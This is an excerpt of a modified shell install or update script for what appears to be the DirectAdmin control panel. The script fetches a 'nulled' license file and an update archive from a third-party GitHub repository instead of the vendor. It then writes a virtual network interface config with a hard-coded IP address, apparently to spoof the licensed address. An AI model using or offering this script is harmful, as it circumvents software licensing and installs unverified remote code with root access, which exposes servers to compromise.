...
case "$1" in
	...
	if [ "$1" = "auto" ]; then
		...
		${WGET_PATH} -O ${LID_INFO} https://raw.githubusercontent.com/akkradet/DA/master/nulled.txt
		if [ ! -s ${LID_INFO} ]; then
...
if [ -e $OS_OVERRIDE_FILE ]; then
	...
	EXTRA_VALUE="${EXTRA_VALUE}&os=${OS_OVERRIDE}"
		...
		$BIN_DIR/wget $WGET_OPTION -S --tries=5 --timeout=60 -O $DA_PATH/update.tar.gz $BIND_ADDRESS "${HTTP}://raw.githubusercontent.com/akkradet/DA/master/update.tar.gz"
...
INET=`ifconfig  | head -1 | awk '{print $1}'`
echo "DEVICE=${INET}100" > /etc/sysconfig/network-scripts/ifcfg-${INET}100
echo "BOOTPROTO=none" >> /etc/sysconfig/network-scripts/ifcfg-${INET}100
echo "ONPARENT=yes" >> /etc/sysconfig/network-scripts/ifcfg-${INET}100
echo "IPADDR=181.214.179.208" >> /etc/sysconfig/network-scripts/ifcfg-${INET}100
